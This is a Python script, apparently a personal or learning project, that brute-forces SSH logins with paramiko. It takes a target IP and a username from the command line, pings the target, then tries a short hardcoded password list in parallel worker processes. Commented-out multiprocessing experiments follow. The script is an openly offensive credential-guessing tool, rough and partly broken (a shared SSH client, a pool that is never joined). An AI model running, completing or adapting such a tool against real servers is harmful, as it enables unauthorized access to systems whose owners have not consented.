import multiprocessing as mp
import paramiko
import time
import optparse
from net_tools import get_ping

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP of the server you want to brute force")
    parser.add_option("-u", "--user", dest="user", help="user name on the server")
    parser.add_option("-p", "--protocol", dest="protocol", help="Protocol you want to use (SSH, FTP...)")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an IP address --help for more info")
    elif not options.protocol:
        parser.error("[-] Please specify a protocol, use --help for more info")
    elif not options.user:
        parser.error("[-] Please specify a username, use --help for more info")
    return options 

def ssh_attack(user,address,password, event):

    if not event.is_set():
        try :
            print('Testing password: ' + password)
            ssh.connect(address, username=user, password=password)
            event.set()
            #return password
        except paramiko.ssh_exception.AuthenticationException:
                print("authentication failed")

if __name__ == '__main__':
    options = get_arguments()
    print("[+]Preparing brute force on server at IP "+ options.target)

    #Checking if the server can be pinged
    get_ping(str(options.target))

    #retrieving a dictionnary of password
    pass_list = ['test1','test2','test3', 'toor', 'test3', 'test3', 'test3']

    #creating the ssh connection object
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
##################################################3
#    for password in pass_list:
#        ssh_attack(options.user, options.target, password)
#########################################################
    pool = mp.Pool(processes=2)
    manager = mp.Manager()
    event = manager.Event()
    t1 = time.time()
    '''for synchronous'''
#    [pool.apply(ssh, args=(x,)) for x in pass_list]

    '''For Asynchronous'''
    #results = [pool.apply_async(ssh_attack, args=(options.user, options.target, x)) for x in pass_list]
    #results = [pool.apply_async(ssh_attack, args=(options.user, options.target, x, event)) for x in pass_list]
    #output = [p.get() for p in results]
    #print(output)

    for password in pass_list:
        pool.apply_async(ssh_attack, args=(options.user, options.target, password, event)) 
    print('Code executed in: ', time.time() - t1)
    
    ####################################################
#    def f(q,x,n, array):
#    print(x%2)
#    if x==3:
#        n.value = 3
#        i =0
#        #for j in "test":
#        #    array[i] = j
#        #    i+=1
#        array="test"
#
#    q.put([x])
#
#if __name__ == '__main__':
#    n = Value('i',1)
#    q = Queue()
#    array = Array('c', 15)
#
#    p = [Process(target=f, args=(q,x,n,array)) for x in range(5)]
#    for pr in p:
#       pr.start()
#        print(q.get())    # prints "[42, None, 'hello']"
#        pr.join()
#print(n.value)
#print(array[:])
